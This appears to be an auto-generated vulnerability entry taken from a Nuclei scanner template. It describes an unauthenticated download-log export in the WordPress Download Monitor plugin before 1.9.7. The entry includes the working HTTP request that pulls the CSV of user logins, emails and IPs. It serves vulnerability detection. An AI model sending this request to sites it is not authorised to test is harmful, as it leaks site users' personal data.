# Vulnerability: Download Monitor < 1.9.7 - Unauthenticated Download Log Export
**Classification:** WORDPRESS
**Source:** Nuclei Template (`download-monitor-unauth-log-export.yaml`)

## Description
Detected Download Monitor plugin before 1.9.7 exposed the full download log CSV to unauthenticated users, revealing fields including User Login, User Email, User IP, and User Agent for every recorded download.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /wp-admin/admin-ajax.php?action=test&dlm_download_logs=true HTTP/1.1
Host: {{Hostname}}
```

